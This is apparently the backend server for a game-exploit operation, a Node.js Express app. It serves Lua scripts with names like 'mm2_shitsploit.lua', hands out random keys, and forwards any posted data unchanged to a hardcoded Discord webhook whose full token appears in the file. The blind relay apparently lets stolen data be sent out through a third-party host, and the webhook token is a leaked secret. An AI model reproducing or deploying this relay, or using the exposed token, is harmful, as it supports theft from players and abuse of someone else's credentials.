const express = require('express')
const { WebSocketServer } = require('ws')
const http = require('http')
const fetch = require('node-fetch')
const crypto = require('crypto')
const fs = require('fs')

const app = express()
const server = http.createServer(app)
const wss = new WebSocketServer({ server, path: '/ws' })
const wssl = new WebSocketServer({ server, path: '/wsl' })

app.use(express.json())
app.use(express.raw({ type: '*/*', limit: '10mb' }))

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1558512005340463214/gC9JNEOJDgRYBNEjy6DJ-mfeD3quipUnHn90FtQj2oY8JXmZNUkEYXszMHdJRbOjenRa"

const K   = crypto.randomBytes(32).toString('hex')
const WK  = crypto.randomBytes(32).toString('hex')
const WXK = crypto.randomBytes(32).toString('hex')

app.get('/k',   (req, res) => res.send(K))
app.get('/wk',  (req, res) => res.send(WK))
app.get('/wxk', (req, res) => res.send(WXK))

app.get('/static/pfp.png', (req, res) => {
    res.redirect('https://i.imgur.com/4M34hi2.png')
})

app.get('/scripts/:name', (req, res) => {
    const allowed = ['mm2_value.lua', 'mm2_shitsploit.lua']
    if (!allowed.includes(req.params.name)) return res.status(404).send('not found')
    try {
        const content = fs.readFileSync(`./scripts/${req.params.name}`, 'utf8')
        res.setHeader('Content-Type', 'text/plain')
        res.send(content)
    } catch {
        res.status(404).send('not found')
    }
})

app.post('/webhook', async (req, res) => {
    try {
        let body = req.body
        if (Buffer.isBuffer(body)) body = body.toString('utf8')

        const r = await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: typeof body === 'string' ? body : JSON.stringify(body)
        })

        res.status(r.status).send('ok')
    } catch(e) {
        console.error('webhook relay error:', e)
        res.status(500).send('error')
    }
})

wss.on('connection', (ws) => {
    console.log('ws client connected')
    ws.on('message', (data) => {
        console.log('ws msg:', data.toString().slice(0, 64))
        try {
            const parsed = JSON.parse(data.toString())
            if (parsed.type === 'pong') return
        } catch {}
    })
    ws.on('close', () => console.log('ws client disconnected'))
})

wssl.on('connection', (ws) => {
    ws.on('message', (data) => {
        console.log('wsl ping:', data.toString().slice(0, 64))
        ws.close()
    })
})

const PORT = process.env.PORT || 3000
server.listen(PORT, () => console.log(`proxy live → port ${PORT}`))
